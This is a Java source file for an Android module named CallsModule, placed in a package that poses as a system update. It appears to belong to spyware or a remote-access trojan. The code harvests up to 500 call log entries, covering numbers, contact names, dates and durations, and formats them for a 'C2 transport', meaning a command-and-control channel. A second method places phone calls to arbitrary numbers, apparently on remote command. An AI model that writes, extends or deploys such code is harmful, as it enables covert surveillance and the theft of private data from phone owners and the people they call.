package com.android.system.update.modules;

import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.database.Cursor;
import android.net.Uri;
import android.os.Build;
import android.provider.CallLog;
import android.util.Log;

import org.json.JSONArray;
import org.json.JSONObject;

public class CallsModule {
    private static final String TAG = "CallsModule";
    private static final int MAX_LOGS = 500;
    private final Context context;

    public CallsModule(Context context) {
        this.context = context;
    }

    // ── Retrieve call logs ────────────────────────────────────────────────────

    public String getCallLogs() {
        Log.d(TAG, "📞 getCallLogs() called");
        JSONArray callsArray = new JSONArray();

        try {
            ContentResolver resolver = context.getContentResolver();

            String[] projection = {
                CallLog.Calls.NUMBER,
                CallLog.Calls.CACHED_NAME,
                CallLog.Calls.TYPE,
                CallLog.Calls.DATE,
                CallLog.Calls.DURATION,
            };

            // ── IMPORTANT: sortOrder must NOT contain LIMIT.
            // Putting "LIMIT N" in the sortOrder string of ContentResolver.query()
            // throws "Invalid token LIMIT" on Samsung/AOSP SQLite builds because
            // that argument maps directly to ORDER BY, not a full SQL suffix.
            String sortOrder = CallLog.Calls.DATE + " DESC";

            Cursor cursor;

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                // API 26+: Bundle overload supports QUERY_ARG_LIMIT natively
                android.os.Bundle queryArgs = new android.os.Bundle();
                queryArgs.putString(ContentResolver.QUERY_ARG_SQL_SORT_ORDER, sortOrder);
                queryArgs.putInt(ContentResolver.QUERY_ARG_LIMIT, MAX_LOGS);
                cursor = resolver.query(CallLog.Calls.CONTENT_URI, projection, queryArgs, null);
            } else {
                // API < 26: retrieve all, slice manually below
                cursor = resolver.query(CallLog.Calls.CONTENT_URI, projection, null, null, sortOrder);
            }

            if (cursor == null) {
                Log.w(TAG, "⚠️ Cursor null — READ_CALL_LOG permission missing?");
                return "[{\"error\":\"Permission denied or no call logs\"}]";
            }

            Log.d(TAG, "📞 Cursor count: " + cursor.getCount());

            int numberIdx   = cursor.getColumnIndex(CallLog.Calls.NUMBER);
            int nameIdx     = cursor.getColumnIndex(CallLog.Calls.CACHED_NAME);
            int typeIdx     = cursor.getColumnIndex(CallLog.Calls.TYPE);
            int dateIdx     = cursor.getColumnIndex(CallLog.Calls.DATE);
            int durationIdx = cursor.getColumnIndex(CallLog.Calls.DURATION);

            int count = 0;
            while (cursor.moveToNext()) {
                if (count >= MAX_LOGS) break;
                try {
                    String number   = numberIdx   >= 0 ? cursor.getString(numberIdx)  : "Unknown";
                    String name     = nameIdx     >= 0 ? cursor.getString(nameIdx)    : "";
                    int    type     = typeIdx     >= 0 ? cursor.getInt(typeIdx)        : 0;
                    long   date     = dateIdx     >= 0 ? cursor.getLong(dateIdx)       : 0L;
                    int    duration = durationIdx >= 0 ? cursor.getInt(durationIdx)    : 0;

                    // ── CRITICAL: strip any \n or \r from strings before putting
                    // them in JSON — the C2 transport uses readLine() so a newline
                    // inside a JSON value splits the packet and corrupts parsing.
                    if (number == null) number = "Unknown";
                    if (name   == null) name   = "";
                    number = number.replace("\n", "").replace("\r", "").trim();
                    name   = name  .replace("\n", "").replace("\r", "").trim();

                    String formattedDate = formatDate(date);
                    // formatDate uses a locale pattern that shouldn't contain \n,
                    // but sanitise anyway for safety.
                    formattedDate = formattedDate.replace("\n", " ").replace("\r", "");

                    JSONObject callObj = new JSONObject();
                    callObj.put("number",         number);
                    callObj.put("name",           name);
                    callObj.put("type",           callTypeToString(type));
                    callObj.put("date",           date);
                    callObj.put("duration",       String.valueOf(duration));
                    callObj.put("formatted_date", formattedDate);

                    callsArray.put(callObj);
                    count++;
                } catch (Exception e) {
                    Log.e(TAG, "Error parsing call log row", e);
                }
            }
            cursor.close();

            Log.d(TAG, "📞 Returning " + callsArray.length() + " call logs");
            // Ensure the final JSON string itself has no literal newlines
            return callsArray.toString().replace("\n", "").replace("\r", "");

        } catch (SecurityException se) {
            Log.e(TAG, "❌ SecurityException — READ_CALL_LOG denied", se);
            return "[{\"error\":\"Permission denied: READ_CALL_LOG\"}]";
        } catch (Exception e) {
            Log.e(TAG, "❌ Error reading call logs: " + e.getMessage(), e);
            return "[{\"error\":\"" + e.getMessage() + "\"}]";
        }
    }

    // ── Initiate a call ───────────────────────────────────────────────────────

    public String makeCall(String number) {
        if (number == null || number.trim().isEmpty()) {
            return "ERROR: No number provided";
        }
        number = number.trim();
        Log.d(TAG, "📞 makeCall: " + number);

        try {
            Uri callUri = Uri.parse("tel:" + Uri.encode(number));
            boolean hasPermission = context.checkSelfPermission(
                    android.Manifest.permission.CALL_PHONE)
                == android.content.pm.PackageManager.PERMISSION_GRANTED;

            Intent intent = hasPermission
                ? new Intent(Intent.ACTION_CALL, callUri)
                : new Intent(Intent.ACTION_DIAL, callUri);
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);

            context.startActivity(intent);
            Log.d(TAG, "✅ Call intent launched for: " + number);
            return "SUCCESS: Calling " + number;

        } catch (SecurityException se) {
            Log.e(TAG, "❌ SecurityException launching call", se);
            try {
                Intent dialIntent = new Intent(Intent.ACTION_DIAL,
                    Uri.parse("tel:" + Uri.encode(number)));
                dialIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                context.startActivity(dialIntent);
                return "DIALLER_OPENED: " + number;
            } catch (Exception ex) {
                return "ERROR: " + ex.getMessage();
            }
        } catch (Exception e) {
            Log.e(TAG, "❌ makeCall error: " + e.getMessage(), e);
            return "ERROR: " + e.getMessage();
        }
    }

    // ── Helpers ───────────────────────────────────────────────────────────────

    private String callTypeToString(int type) {
        switch (type) {
            case CallLog.Calls.INCOMING_TYPE:  return "INCOMING";
            case CallLog.Calls.OUTGOING_TYPE:  return "OUTGOING";
            case CallLog.Calls.MISSED_TYPE:    return "MISSED";
            case CallLog.Calls.REJECTED_TYPE:  return "REJECTED";
            case CallLog.Calls.VOICEMAIL_TYPE: return "VOICEMAIL";
            case CallLog.Calls.BLOCKED_TYPE:   return "BLOCKED";
            case 7:                            return "ANSWERED_EXTERNALLY";
            default:                           return "UNKNOWN";
        }
    }

    private String formatDate(long timestamp) {
        if (timestamp == 0) return "Unknown date";
        try {
            // Use a fixed locale to avoid locale-specific characters that
            // might introduce unexpected whitespace or non-ASCII characters.
            java.text.SimpleDateFormat sdf = new java.text.SimpleDateFormat(
                "MMM dd, yyyy HH:mm", java.util.Locale.US);
            return sdf.format(new java.util.Date(timestamp));
        } catch (Exception e) {
            return "Unknown date";
        }
    }
}
